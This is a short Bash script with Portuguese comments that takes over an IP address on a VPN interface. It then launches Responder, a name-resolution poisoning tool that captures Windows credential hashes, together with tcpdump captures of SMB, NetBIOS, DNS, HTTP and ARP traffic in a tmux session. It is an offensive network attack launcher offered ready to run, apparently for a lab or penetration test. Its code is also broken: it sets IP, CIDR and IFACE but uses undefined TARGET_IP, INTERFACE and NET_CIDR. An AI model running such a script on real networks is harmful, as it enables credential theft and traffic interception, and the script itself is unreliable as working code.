#!/bin/bash

# === CONFIG ===
IP="10.10.10.88"        # IP que será configurado na interface VPN
CIDR="24"               # Máscara da rede
IFACE="tun0"            # Interface VPN
SESSION="ip_monitor"
LOG_DIR="/tmp/ip_takeover_logs"
DUMP_FILE="$LOG_DIR/tcpdump_$TARGET_IP.pcap"

# === CLEANUP ===
echo "[+] Matando processos anteriores..."
sudo pkill responder 2>/dev/null
sudo pkill tcpdump 2>/dev/null
tmux kill-session -t "$SESSION" 2>/dev/null
mkdir -p "$LOG_DIR"

# === CONFIGURANDO INTERFACE ===
echo "[+] Configurando IP $TARGET_IP em $INTERFACE..."
sudo ip addr flush dev "$INTERFACE"
sudo ip addr add "$TARGET_IP/$NET_CIDR" dev "$INTERFACE"
sudo ip route add "${TARGET_IP%.*}.0/$NET_CIDR" dev "$INTERFACE"

# === ABRE TMUX COM TUDO ===
tmux new-session -d -s "$SESSION" -n "Responder"
tmux send-keys -t "$SESSION:0" "echo '[+] RESPONDER ATIVO'; sudo responder -I $INTERFACE -v" C-m

tmux split-window -v -t "$SESSION:0"
tmux send-keys -t "$SESSION:0.1" "echo '[+] TCPDUMP MONITORANDO'; sudo tcpdump -i $INTERFACE -nn -l 'port 137 or port 138 or port 445 or port 80 or port 53'" C-m

tmux split-window -h -t "$SESSION:0.1"
tmux send-keys -t "$SESSION:0.2" "echo '[+] MONITORANDO ARP'; sudo tcpdump -i $INTERFACE arp" C-m

tmux select-pane -t 0
tmux attach-session -t "$SESSION"
